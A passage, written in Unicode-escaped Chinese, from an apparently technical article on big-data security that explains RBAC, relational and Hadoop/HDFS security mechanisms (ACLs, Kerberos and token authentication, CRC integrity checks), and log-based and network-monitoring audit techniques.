\u8bb8\u53ef\u4e5f\u53eb\u6743\u9650\uff0c\u5c31\u662f\u5141\u8bb8\u5bf9\u4e00\u4e2a\u6216\u591a\u4e2a\u5ba2\u4f53\u6267\u884c\u64cd\u4f5c\uff1b \u89d2\u8272\uff0c\u5c31\u662f\u8bb8\u53ef\u7684\u96c6\u5408\uff1b \u4f1a\u8bdd\uff0c\u4e00\u6b21\u4f1a\u8bdd\u662f\u7528\u6237\u7684\u4e00\u4e2a\u6d3b\u8dc3\u8fdb\u7a0b\uff0c\u5b83\u4ee3\u8868\u7528\u6237\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u3002\u6807\u51c6\u4e0a\u8bf4\uff0c\u6bcf\u4e2asession\u662f\u4e00\u4e2a\u6620\u5c04\uff0c\u4e00\u4e2a\u7528\u6237\u5230\u591arole\u7684\u6620\u5c04\u3002\u5f53\u4e00\u4e2a\u7528\u6237\u6fc0\u6d3b\u4ed6\u6240\u6709\u6240\u6709\u89d2\u8272\u7684\u4e00\u4e2a\u5b50\u96c6\u7684\u65f6\u5019\uff0c\u5efa\u7acb\u4e00\u4e2asession\uff1b \u6d3b\u8dc3\u89d2\u8272\uff08active role\uff09\uff0c\u4e00\u4e2a\u4f1a\u8bdd\u6784\u6210\u4e00\u4e2a\u7528\u6237\u5230\u591a\u4e2a\u89d2\u8272\u7684\u6620\u5c04\uff0c\u5373\u4f1a\u8bdd\u6fc0\u6d3b\u4e86\u7528\u6237\u6388\u6743\u89d2\u8272\u7684\u67d0\u4e2a\u5b50\u96c6\uff0c\u8fd9\u4e2a\u5b50\u96c6\u6210\u4e3a\u6d3b\u8dc3\u89d2\u8272\u96c6\u3002 RBAC\u7684\u57fa\u672c\u6a21\u578b\u5982\u4e0b\u56fe\uff1a 03.03 \u5173\u7cfb\u578b\u6570\u636e\u5e93\u5b89\u5168\u7b56\u7565 \u5173\u7cfb\u578b\u6570\u636e\u5e93\u90fd\u8bbe\u7f6e\u4e86\u76f8\u5bf9\u5b8c\u5907\u7684\u5b89\u5168\u673a\u5236\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5927\u6570\u636e\u5b58\u50a8\u53ef\u4ee5\u4f9d\u8d56\u4e8e\u6570\u636e\u5e93\u7684\u5b89\u5168\u673a\u5236\uff0c\u5b89\u5168\u98ce\u9669\u5927\u5927\u964d\u4f4e\u3002\u4f8b\u5982SQL Server\u5b89\u5168\u673a\u5236\u5982\u4e0b\uff1a \u8eab\u4efd\u9a8c\u8bc1\uff08Windows NT\u8ba4\u8bc1\u6a21\u5f0f\uff0c\u6df7\u5408\u8ba4\u8bc1\u6a21\u5f0f\uff09 \u8bbf\u95ee\u63a7\u5236\uff08\u5bf9\u6bcf\u4e2a\u7528\u6237\u5b9a\u4e49\u5b58\u53d6\u6743\u9650\uff09 \u5ba1\u8ba1\u529f\u80fd \u6570\u636e\u5e93\u52a0\u5bc6\uff08\u901a\u8fc7\u5c06\u6570\u636e\u7528\u5bc6\u6587\u5f62\u5f0f\u5b58\u50a8\u6216\u4f20\u8f93\u7684\u624b\u6bb5\u4fdd\u8bc1\u9ad8\u654f\u611f\u6570\u636e\u7684\u5b89\u5168\uff09 \u5b8c\u6574\u6027\u673a\u5236\uff08\u5b9e\u4f53\u5b8c\u6574\u6027\u3001\u53c2\u7167\u5b8c\u6574\u6027\u3001\u7528\u6237\u81ea\u5b9a\u4e49\u5b8c\u6574\u6027\uff09 \u89e6\u53d1\u5668\u673a\u5236 \u89c6\u56fe\u548c\u5b58\u50a8\u8fc7\u7a0b\u673a\u5236 \u5907\u4efd\u3001\u6062\u590d\u548c\u5e76\u53d1\u63a7\u5236\u673a\u5236 03.04 \u975e\u5173\u7cfb\u578b\u6570\u636e\u5757\u5b89\u5168\u7b56\u7565 \u8d8a\u6765\u8d8a\u591a\u7684\u4f01\u4e1a\u91c7\u7528\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u5b58\u50a8\u5927\u6570\u636e\uff0c\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u5b58\u50a8\u7684\u5b89\u5168\u95ee\u9898\u7684\u63a2\u8ba8\u5341\u5206\u5fc5\u8981\u3002\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e3b\u8981\u901a\u8fc7\u4e8b\u52a1\u652f\u6301\u6765\u5b9e\u73b0\u6570\u636e\u5b58\u53d6\u7684\u539f\u5b50\u6027\u3001\u4e00\u81f4\u6027\u3001\u9694\u79bb\u6027\u548c\u6301\u4e45\u6027\uff0c\u4fdd\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\u548c\u6b63\u786e\u6027\uff0c\u540c\u65f6\u5bf9\u6570\u636e\u5e93\u8868\u3001\u884c\u3001\u5b57\u6bb5\u7b49\u63d0\u4f9b\u57fa\u4e8e\u7528\u6237\u7ea7\u522b\u7684\u6743\u9650\u8bbf\u95ee\u63a7\u5236\u53ca\u52a0\u5bc6\u673a\u5236\u3002 NoSQL\u6570\u636e\u5e93\u4e3a\u5927\u6570\u636e\u5904\u7406\u63d0\u4f9b\u4e86\u9ad8\u53ef\u7528\u3001\u9ad8\u53ef\u6269\u5c55\u7684\u5927\u89c4\u6a21\u6570\u636e\u5b58\u50a8\u65b9\u6848\uff0c\u4f46\u7f3a\u4e4f\u8db3\u591f\u7684\u5b89\u5168\u4fdd\u8bc1\u3002\u5982\uff1aNoSQL\u6570\u636e\u5e93\u7f3a\u5c11Schema\uff0c\u56e0\u6b64\u4e0d\u80fd\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u8f83\u597d\u7684\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u591a\u6570NoSQL\u6570\u636e\u5e93\u4e3a\u4e86\u63d0\u9ad8\u5904\u7406\u6548\u7387\uff0c\u91c7\u7528\u6700\u7ec8\u540c\u6b65\u800c\u5e76\u975e\u6bcf\u6b21\u4ea4\u6613\u540c\u6b65\uff0c\u5f71\u54cd\u4e86\u6570\u636e\u7684\u6b63\u786e\u6027\u3002\u76ee\u524d\u591a\u6570\u7684NoSQL\u6570\u636e\u5e93\u6ca1\u6709\u63d0\u4f9b\u5185\u5efa\u7684\u5b89\u5168\u673a\u5236\uff0c\u8fd9\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9650\u5236\u4e86\u5e94\u7528\u7684\u9886\u57df\u53ca\u8303\u56f4\uff0c\u4f46\u968f\u7740NoSQL\u7684\u53d1\u5c55\uff0c\u8d8a\u6765\u8d8a\u591a\u7684\u4eba\u5f00\u59cb\u610f\u8bc6\u5230\u5b89\u5168\u7684\u91cd\u8981\u6027\uff0c\u90e8\u5206NoSQL\u4ea7\u54c1\u9010\u6e10\u5f00\u59cb\u63d0\u4f9b\u4e00\u4e9b\u5b89\u5168\u65b9\u9762\u7684\u652f\u6301\uff0c\u4e0b\u9762\u4ee5Hadoop\u4e3a\u4f8b\uff0c\u4ecb\u7ecd\u5176\u5b89\u5168\u673a\u5236\u3002Hadoop\u7684\u5b89\u5168\u673a\u5236\u4e3b\u8981\u5305\u62ec4\u4e2a\u5185\u5bb9\uff1a\u57fa\u4e8eACL\u7684\u670d\u52a1\u7ea7\u6743\u9650\u63a7\u5236\u3001\u57fa\u4e8e\u4ee4\u724c\u7684\u8ba4\u8bc1\u673a\u5236\u3001HDFS\u6570\u636e\u5b58\u50a8\u7684\u5b8c\u6574\u6027\u4e00\u81f4\u6027\u4fdd\u8bc1\u4e0e\u6570\u636e\u4f20\u8f93\u7684\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002 03.04.01 \u57fa\u4e8eACL\u7684\u6743\u9650\u63a7\u5236 Hadoop\u652f\u6301\u7684\u6743\u9650\u63a7\u5236\u5206\u4e3a\u4e24\u7ea7\uff1a\u670d\u52a1\u7ea7\u6388\u6743\uff08service level authorization\uff09\u4ee5\u53ca\u4e0a\u5c42\u7684HDFS\u6587\u4ef6\u6743\u9650\u63a7\u5236\u548cMapReduce\u961f\u5217\u6743\u9650\u63a7\u5236\uff0c\u670d\u52a1\u7ea7\u6388\u6743\u4e3a\u7cfb\u7edf\u7ea7\uff0c\u7528\u4e8e\u63a7\u5236Hadoop\u670d\u52a1\u7684\u8bbf\u95ee\uff0c\u662f\u6700\u57fa\u7840\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u4f18\u5148\u4e8eHDFS\u6587\u4ef6\u6743\u9650\u548cMapReduce\u961f\u5217\u6743\u9650\u9a8c\u8bc1\u3002 Hadoop\u901a\u8fc7\u8bbf\u95ee\u63a7\u5236\u5217\u8868\u6765\u7ba1\u7406\u670d\u52a1\u7ea7\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u7c7b\u4f3c\u4e8eUNIX\u7cfb\u7edf\u4e2d\u7684\u7528\u6237\u6743\u9650\u7ba1\u7406\uff0cHadoop\u901a\u8fc7\u7528\u6237\u540d\u548c\u7ec4\u6765\u7ba1\u7406\u6743\u9650\uff0c\u6bcf\u4e2a\u670d\u52a1\u53ef\u4ee5\u914d\u7f6e\u4e3a\u88ab\u6240\u6709\u7528\u6237\u8bbf\u95ee\uff0c\u4e5f\u53ef\u4ee5\u88ab\u9650\u5236\u4e3a\u4ec5\u88ab\u67d0\u4e9b\u7ec4\u7684\u67d0\u4e9b\u7528\u6237\u8bbf\u95ee\u3002Hadoop\u67099\u4e2a\u53ef\u914d\u7f6e\u7684ACL\u5c5e\u6027\uff0c\u6bcf\u4e2a\u5c5e\u6027\u53ef\u6307\u5b9a\u62e5\u6709\u76f8\u5e94\u8bbf\u95ee\u6743\u9650\u7684\u7528\u6237\u6216\u8005\u7528\u6237\u7ec4\u3002 ACL\u5c5e\u6027 \u8bf4\u660e Security.client.protocol.acl ACL for ClientProtocol\uff0c\u7528\u6237HDFS\u5ba2\u6237\u7aef\u5bf9KDFS\u8bbf\u95ee\u7684\u6743\u9650\u63a7\u5236 Security.client.datanode.prtocol.acl ACL for ClientDataNodeProtocol\uff0cclient\u5230DataNode\u7684\u8bbf\u95ee\u6743\u9650\u63a7\u5236\uff0c\u7528\u4e8eblock\u6062\u590d Security.datanode.protocol.acl ACL for DataNodeProtocol\uff0c\u7528\u4e8eDataNode\u4e0eNameNode\u4e4b\u95f4\u901a\u4fe1\u7684\u8bbf\u95ee\u63a7\u5236 Security.inter.datanode.protocol.acl ACL for InterDataNodeProtocol\uff0c\u7528\u4e8eDataNode\u4e4b\u95f4\u66f4\u65b0timestamp Security.namenode.protocol.acl ACL for NameNodeProtocol\uff0c\u7528\u4e8eSecondNameNode\u4e0eNameNode\u95f4\u901a\u4fe1\u7684\u8bbf\u95ee\u63a7\u5236 Security.inter.tracker.protocol.acl ACL for InterTrackerProtocol\uff0c\u7528\u4e8etasktracker\u4e0ejobtracker\u4e4b\u95f4\u901a\u4fe1\u7684\u8bbf\u95ee\u63a7\u5236 Security.job.submission.protocol.acl ACL for JobSubmissionProtocol\uff0c\u7528\u4e8ejob\u5ba2\u6237\u7aef\u63d0\u4ea4\u4f5c\u4e1a\u4e0e\u67e5\u8be2\u4f5c\u4e1a\u7684\u8bbf\u95ee\u63a7\u5236 Security.task.unbilical.protocol.acl ACL for TaskUmbilicalProtocol\uff0c\u7528\u4e8etask\u4e0e\u5176tasktracker\u7684\u8bbf\u95ee\u63a7\u5236 Security.refresh.policy.protocol.acl ACL for RefreshAuthorizationPolicyProtocol\uff0c\u7528\u4e8edfsadmin\u548cmradmin\u66f4\u65b0\u5176\u5b89\u5168\u914d\u7f6e\u7684\u8bbf\u95ee\u63a7\u5236 \u901a\u8fc7ACL\u6743\u9650\u63a7\u5236\uff0cHadoop\u80fd\u4fdd\u8bc1\u6570\u636e\u5e93\u5e95\u5c42HDFS\u6587\u4ef6\u7cfb\u7edf\u7684\u670d\u52a1\u7ea7\u5b89\u5168\u8bbf\u95ee\uff0c\u901a\u8fc7\u7528\u6237\u548c\u7ec4\u7684\u9650\u5236\uff0c\u9632\u6b62\u975e\u6cd5\u7528\u6237\u5bf9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002\u6587\u4ef6\u7684\u6743\u9650\u4e3b\u8981\u7531NameNode\u7ba1\u7406\u3002 03.04.02 \u57fa\u4e8e\u4ee4\u724c\u7684\u8ba4\u8bc1\u673a\u5236 HDFS\u7684\u670d\u52a1\u95f4\u4ea4\u4e92\u57fa\u672c\u90fd\u662f\u901a\u8fc7\u8fdc\u7a0b\u8c03\u7528\u534f\u8bae\uff08RPC\uff0cremote procedurecall protocol\uff09\u4ea4\u4e92\uff0c\u4f46\u662fHDFS\u5ba2\u6237\u7aef\u83b7\u53d6\u6570\u636e\u65f6\u5374\u4e0d\u5b8c\u5168\u4f9d\u9760RPC\u673a\u5236\u3002\u5f53HDFS\u5ba2\u6237\u7aef\u8bbf\u95ee\u6570\u636e\u65f6\uff0c\u4e3b\u8981\u5305\u62ec2\u4e2a\u8fc7\u7a0b\uff1a \u5ba2\u6237\u7aef\u8bbf\u95eeNameNode\uff0c\u83b7\u53d6\u6570\u636e\u7684\u6570\u636e\u5757\u4fe1\u606f\uff0c\u6b64\u8fc7\u7a0b\u901a\u8fc7RPC\u4ea4\u4e92\uff1b \u5ba2\u6237\u7aef\u83b7\u53d6\u5230\u6570\u636e\u4f4d\u7f6e\u540e\uff0c\u76f4\u63a5\u8bbf\u95eeDataNode\uff0c\u6839\u636e\u6570\u636e\u5757\u4f4d\u7f6e\u4fe1\u606f\u76f4\u63a5\u901a\u8fc7SOCKET\u8bfb\u53d6\u6570\u636e\u3002Hadoop\u7684RPC\u6d88\u606f\u673a\u5236\u5728SASL\uff08Simple Authentication and Security Layer\uff09\u7684\u57fa\u7840\u4e0a\u5b9e\u73b0\u4e86\u4e24\u79cd\u8ba4\u8bc1\u673a\u5236\uff1a\u57fa\u4e8eGSSAPI\u7684Kerberos\u8ba4\u8bc1\u673a\u5236\u548c\u57fa\u4e8eDIGEST-MD5de\u4ee4\u724c\u8ba4\u8bc1\u673a\u5236\uff0c\u4ee4\u724c\u8ba4\u8bc1\u5305\u62ecHDFS\u4e2d\u7684\u6388\u6743\u4ee4\u724c\uff08delegation token\uff09\u3001\u5757\u8bbf\u95ee\u4ee4\u724c\uff08block access token\uff09\uff0c\u4ee5\u53caMapReduce\u6846\u67b6\u4e2d\u7684\u4efb\u52a1\u4ee4\u724c\uff08job token\uff09\u3002\u4ee4\u724c\u673a\u5236\u7684\u672c\u8d28\u5c31\u662f\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u8282\u70b9\u5171\u4eab\u5bc6\u94a5\uff0c\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u53ef\u4ee5\u76f8\u4e92\u8ba4\u8bc1\uff0c\u670d\u52a1\u7aef\u5c06\u54cd\u5e94\u5ba2\u6237\u7aef\u7684\u8bbf\u95ee\u3002\u4ee4\u724c\u7531NameNode\u7ba1\u7406\uff0cDataNode\u4e0d\u53c2\u4e0e\u4ee4\u724c\u7684\u7ba1\u7406\u3002 NameNode\u7aef\u4fdd\u5b58\u4e86\u4e00\u4e2a\u968f\u673a\u4ea7\u751f\u7684masterKey\uff0c\u7528\u6765\u4ea7\u751f\u548c\u8bc6\u522b\u4ee4\u724c\uff0c\u6240\u6709\u7684\u4ee4\u724c\u90fd\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u5e76\u4e14\u6bcf\u4e2a\u4ee4\u724c\u90fd\u6709\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\uff0c\u8fc7\u671f\u7684\u4ee4\u724c\u5c06\u88ab\u5220\u9664\u3002\u521d\u59cb\u72b6\u6001\u65f6\uff0c\u5ba2\u6237\u7aef\u5fc5\u987b\u4e0eNameNode\u5efa\u7acb\u4e2a\u7ecf\u8fc7Kerberos\u8ba4\u8bc1\u7684\u8fde\u63a5\uff0c\u4ece\u800c\u83b7\u5f97\u4e00\u4e2a\u6388\u6743\u4ee4\u724c\uff0c\u800c\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7\u4ee4\u724c\u4e0eNameNode\u8fdb\u884c\u4ea4\u4e92\u3002\u5df2\u7ecf\u83b7\u5f97\u4ee4\u724c\u7684\u5ba2\u6237\u7aef\u8bbf\u95eeNameNode\u65f6\uff0c\u5c06TokenID\u53d1\u9001\u5230NameNode\uff0cNameNode\u901a\u8fc7TokenID\u53ef\u4ee5\u5728\u5185\u5b58\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u4ee4\u724c\uff0c\u5e76\u4e14\u6839\u636emasterKey\u4e0eTokenID\u53ef\u4ee5\u8ba1\u7b97\u51fa\u5171\u4eab\u5bc6\u94a5TokenAuthenticator\u548cDelegation Token\u3002\u5728\u6388\u6743\u4ee4\u724c\u80fd\u88ab\u8ba4\u8bc1\u7684\u57fa\u7840\u4e0a\uff0c\u4ee4\u724c\u8fd8\u9700\u8981\u5468\u671f\u6027\u5730\u4eceNameNode\u66f4\u65b0\uff0c\u4ee5\u4fdd\u8bc1\u79c1\u5bc6\u6027\uff0cNameNode\u4e5f\u4f1a\u5468\u671f\u6027\u7684\u66f4\u65b0masterKey\u4ee5\u4ea7\u751f\u65b0\u7684\u6388\u6743\u4ee4\u724c\u3002 \u5bf9\u4e8e\u5757\u8bbf\u95ee\u4ee4\u724c\u6765\u8bf4\uff0c\u5982\u4f55\u5728NameNode\u4ea7\u751f\u5e76\u4e14\u80fd\u88abDataNode\u8bc6\u522b\u662f\u4e00\u4e2a\u95ee\u9898\uff0cHDFS\u4e2d\uff0c\u8fd9\u4e2a\u95ee\u9898\u901a\u8fc7NameNode\u4e0e\u6240\u6709\u7684DataNode\u4e4b\u95f4\u5171\u4eab\u65b0\u7684\u4e00\u5957\u5bc6\u94a5\u6765\u89e3\u51b3\u3002\u5f53HDFS\u96c6\u7fa4\u542f\u52a8\u65f6\uff0c\u7ecf\u8fc7Kerberos\u8ba4\u8bc1\u7684DataNode\u5411NameNode\u6ce8\u518c\uff0c\u5e76\u4e14\u4eceNameNode\u4e2d\u83b7\u53d6\u5bc6\u94a5key\u3002\u5f53\u5ba2\u6237\u7aef\u8bbf\u95eeNameNode\u65f6\uff0c\u8fd4\u56deDataNode\u4e2d\u6570\u636e\u7684block ID\u548c\u5757\u8bbf\u95ee\u4ee4\u724c\uff0c\u7136\u540e\u5ba2\u6237\u7aef\u5c06\u4ee4\u724c\u53d1\u9001\u5230DataNode\uff0cDataNode\u6839\u636eTokenID\u4e2d\u7684key ID\u786e\u5b9a\u9700\u8981\u7528\u54ea\u4e2a\u5bc6\u94a5key\uff0c\u5e76\u901a\u8fc7Key\u548cTokenID\u91cd\u65b0\u8ba1\u7b97TokenAuthenticator\uff0c\u5e76\u4e14\u548c\u5757\u8bbf\u95ee\u4ee4\u724c\u4e2d\u7684TokenAuthenticator\u8fdb\u884c\u6bd4\u8f83\u5c31\u53ef\u4ee5\u786e\u5b9a\u662f\u5426\u80fd\u591f\u901a\u8fc7\u8ba4\u8bc1\uff0c\u5ba2\u6237\u7aef\u4f1a\u5c06\u6240\u6709\u7684DataNode\u4ee4\u724c\u90fd\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\u91cd\u590d\u4f7f\u7528\uff0c\u76f4\u5230\u8fc7\u671f\u624d\u4f1a\u4ece\u65b0\u4eceNameNode\u83b7\u53d6\u3002\u7531\u4e8e\u5757\u8bbf\u95ee\u4ee4\u724c\u90fd\u662f\u8f7b\u91cf\u7ea7\u7684\u548c\u4e34\u65f6\u7684\uff0c\u56e0\u6b64DataNode\u4e2d\u7684\u4ee4\u724c\u4e0d\u9700\u8981\u5468\u671f\u6027\u5730\u66f4\u65b0\uff0c\u53ea\u9700\u8981\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff0c\u4e00\u8fc7\u671f\u624d\u8fdb\u884c\u66f4\u65b0\u3002 03.04.03 \u6570\u636e\u5b8c\u6574\u6027\u4e0e\u4e00\u81f4\u6027 HDFS\u7684\u6570\u636e\u5b8c\u6574\u6027\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff1a\u6570\u636e\u8bbf\u95ee\u7684\u5b8c\u6574\u6027\u548c\u6570\u636e\u4f20\u8f93\u7684\u5b8c\u6574\u6027\u3002 \u6570\u636e\u8bbf\u95ee\u7684\u5b8c\u6574\u6027\uff1aHDFS\u4e3b\u8981\u5b9e\u73b0\u4e86CRC32\u6821\u9a8c\u3002HDFS\u5ba2\u6237\u7aef\u5728\u8bbf\u95eeDataNode\u6570\u636e\u5757\u65f6\uff0c\u662f\u901a\u8fc7socket\u7684\u65b9\u5f0f\u83b7\u53d6\u6570\u636e\u6d41\uff0cHadoop\u5728FSInputStream\u548cFSoutputStream\u7684\u57fa\u7840\u4e0a\uff0c\u5b9e\u73b0\u4e24\u4e2a\u652f\u6301\u6821\u9a8c\u548c\u7684\u7c7b\u548c\u6587\u4ef6\u7cfb\u7edf\uff0cFSInputStream\u548cFSoutputStream\u4f7f\u7528\u6570\u636e\u6d41\u652f\u6301\u6821\u9a8c\u548c\u3002\u5728\u5ba2\u6237\u7aef\u5199\u5165\u4e00\u4e2a\u65b0\u7684HDFS\u6587\u4ef6\u65f6\uff0c\u4f1a\u8ba1\u7b97\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u5305\u62ec\u7684\u6240\u6709\u6570\u636e\u5757\u7684\u6821\u9a8c\u548c\uff0c\u5e76\u5c06\u6821\u9a8c\u548c\u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684.crc\u6587\u4ef6\u683c\u5f0f\u7684\u9690\u85cf\u6587\u4ef6\uff0c\u4e0e\u6570\u636e\u6587\u4ef6\u4fdd\u5b58\u5728\u540c\u4e00\u547d\u540d\u7a7a\u95f4\u3002 \u6570\u636e\u4f20\u8f93\u7684\u5b8c\u6574\u6027\uff1aHDFS\u6570\u636e\u5757\u7684\u5b58\u50a8\u652f\u6301\u5b8c\u6574\u6027\u9a8c\u8bc1\uff0c\u4e3b\u8981\u901a\u8fc7\u6838\u5fc3\u7c7bDataBlockScanner\u7c7b\u5b9e\u73b0\uff0c\u5b83\u901a\u8fc7\u5728DataNode\u7684\u540e\u53f0\u6267\u884c\u4e00\u4e2a\u72ec\u7acb\u7684\u626b\u63cf\u7ebf\u7a0b\u7684\u65b9\u5f0f\uff0c\u5468\u671f\u6027\u5730\u5bf9DataNode\u6240\u7ba1\u7406\u7684\u6570\u636e\u5757\u8fdb\u884cCRC\u6821\u9a8c\u548c\u68c0\u67e5\u3002\u5f53\u5b83\u626b\u63cf\u53d1\u73b0\u6570\u636e\u5757\u7684\u6821\u9a8c\u548c\u548c\u539f\u5148\u4e0d\u4e00\u81f4\uff0c\u5c06\u5bf9\u6570\u636e\u5757\u8fdb\u884c\u5176\u4ed6\u8f85\u52a9\u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a\u5220\u9664\u5931\u6548\u7684\u6570\u636e\u5757\u7b49\u3002 04 \u6570\u636e\u53d1\u5e03\u5b89\u5168\u6280\u672f 04.01 \u5b89\u5168\u5ba1\u8ba1 \u5b89\u5168\u5ba1\u8ba1\u662f\u6307\u5728\u8bb0\u5f55\u4e00\u5207\uff08\u6216\u90e8\u5206\uff09\u4e0e\u7cfb\u7edf\u5b89\u5168\u6709\u5173\u6d3b\u52a8\u7684\u57fa\u7840\u4e0a\uff0c\u5bf9\u5176\u8fdb\u884c\u5206\u6790\u5904\u7406\u3001\u8bc4\u4f30\u5ba1\u67e5\uff0c\u67e5\u627e\u5b89\u5168\u9690\u60a3\uff0c\u5bf9\u7cfb\u7edf\u5b89\u5168\u8fdb\u884c\u5ba1\u6838\u3001\u7a3d\u67e5\u548c\u8ba1\u7b97\uff0c\u8ffd\u67e5\u4e8b\u6545\u7684\u539f\u56e0\uff0c\u5e76\u4f5c\u51fa\u8fdb\u4e00\u6b65\u7684\u5904\u7406\u3002 04.01.01 \u57fa\u4e8e\u65e5\u5fd7\u7684\u5ba1\u8ba1\u6280\u672f SQL\u6570\u636e\u5e93\u548cNoSQL\u6570\u636e\u5e93\u5747\u5177\u6709\u65e5\u5fd7\u5ba1\u8ba1\u7684\u529f\u80fd\uff0c\u901a\u8fc7\u914d\u7f6e\u6570\u636e\u5e93\u7684\u81ea\u5ba1\u8ba1\u529f\u80fd\uff0c\u5373\u53ef\u5b9e\u73b0\u5bf9\u5927\u6570\u636e\u7684\u5ba1\u8ba1\uff0c\u5176\u90e8\u7f72\u65b9\u5f0f\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u65e5\u5fd7\u5ba1\u8ba1\u80fd\u591f\u5bf9\u7f51\u7edc\u64cd\u4f5c\u53ca\u672c\u5730\u64cd\u4f5c\u6570\u636e\u7684\u884c\u4e3a\u8fdb\u884c\u5ba1\u8ba1\uff0c\u7531\u4e8e\u4f9d\u6258\u4e8e\u73b0\u6709\u7684\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\uff0c\u517c\u5bb9\u6027\u5f88\u597d\u3002\u4f46\u8fd9\u79cd\u5ba1\u8ba1\u6280\u672f\u7684\u7f3a\u70b9\u4e5f\u6bd4\u8f83\u660e\u663e\uff0c\u9996\u5148\u5728\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u4e0a\u5f00\u542f\u81ea\u8eab\u65e5\u5fd7\u5ba1\u8ba1\u5bf9\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u7684\u6027\u80fd\u6709\u5f71\u54cd\uff0c\u7279\u522b\u662f\u5728\u5927\u6d41\u91cf\u60c5\u51b5\u4e0b\u635f\u8017\u8f83\u5927\uff1b\u5176\u6b21\u65e5\u5fd7\u5ba1\u8ba1\u5728\u8bb0\u5f55\u7684\u7ec6\u7c92\u5ea6\u4e0a\u8f83\u5dee\uff0c\u7f3a\u5c11\u4e00\u4e9b\u5173\u952e\u4fe1\u606f\uff0c\u5982\uff1a\u6e90IP\u3001SQL\u8bed\u53e5\u7b49\uff0c\u5ba1\u8ba1\u6eaf\u6e90\u6548\u679c\u4e0d\u597d\uff1b\u6700\u540e\u5c31\u662f\u65e5\u5fd7\u5ba1\u8ba1\u9700\u8981\u5230\u6bcf\u4e00\u53f0\u88ab\u5ba1\u8ba1\u4e3b\u673a\u4e0a\u8fdb\u884c\u914d\u7f6e\u548c\u67e5\u770b\uff0c\u8f83\u96be\u8fdb\u884c\u7edf\u4e00\u7684\u5ba1\u8ba1\u7b56\u7565\u914d\u7f6e\u548c\u65e5\u5fd7\u5206\u6790\u3002 04.01.02 \u57fa\u4e8e\u7f51\u7edc\u76d1\u542c\u7684\u5ba1\u8ba1\u6280\u672f \u57fa\u4e8e\u7f51\u7edc\u76d1\u542c\u7684\u5ba1\u8ba1\u6280\u672f\u662f\u901a\u8fc7\u5c06\u5bf9\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u7684\u8bbf\u95ee\u6d41\u91cf\u955c\u50cf\u5230\u4ea4\u6362\u673a\u67d0\u4e00\u4e2a\u7aef\u53e3\uff0c\u7136\u540e\u901a\u8fc7\u4e13\u7528\u786c\u4ef6\u8bbe\u5907\u5bf9\u8be5\u7aef\u53e3\u6d41\u91cf\u8fdb\u884c\u5206\u6790\u548c\u8fd8\u539f\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u6570\u636e\u8bbf\u95ee\u7684\u5ba1\u8ba1\u3002\u5176\u5178\u578b\u90e8\u7f72\u793a\u610f\u56fe\u5982\u4e0b\uff1a \u57fa\u4e8e\u7f51\u7edc\u76d1\u542c\u7684\u5ba1\u8ba1\u6280\u672f\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4e0e\u73b0\u6709\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u65e0\u5173\uff0c\u90e8\u7f72\u8fc7\u7a0b\u4e0d\u4f1a\u7ed9\u6570\u636e\u5e93\u7cfb\u7edf\u5e26\u6765\u6027\u80fd\u4e0a\u7684\u8d1f\u62c5\uff0c\u5373\u4f7f\u662f\u51fa\u73b0\u6545\u969c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u6570\u636e\u5e93\u7cfb\u7edf\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u5177\u5907\u6613\u90e8\u7f72\u3001\u65e0\u98ce\u9669\u7684\u7279\u70b9\uff1b\u4f46\u662f\uff0c\u5176\u90e8\u7f72\u7684\u5b9e\u73b0\u539f\u7406\u51b3\u5b9a\u4e86\u7f51\u7edc\u76d1\u542c\u6280\u672f\u5728\u9488\u5bf9\u52a0\u5bc6\u534f\u8bae\u65f6\uff0c\u53ea\u80fd\u5b9e\u73b0\u5230\u4f1a\u8bdd\u7ea7\u522b\u5ba1\u8ba1\uff0c\u5373\u53ef\u4ee5\u5ba1\u8ba1\u5230\u65f6\u95f4\u3001\u6e90IP\u3001\u6e90\u7aef\u53e3\u3001\u76ee\u7684IP\u3001\u76ee\u7684\u7aef\u53e3\u7b49\u4fe1\u606f\uff0c\u800c\u65e0\u6cd5\u5bf9\u5185\u5bb9\u8fdb\u884c\u5ba1\u8ba1\u3002 04.01.03 \u57fa\u4e8e\u7f51\u5173\u7684\u5ba1\u8ba1\u6280\u672f 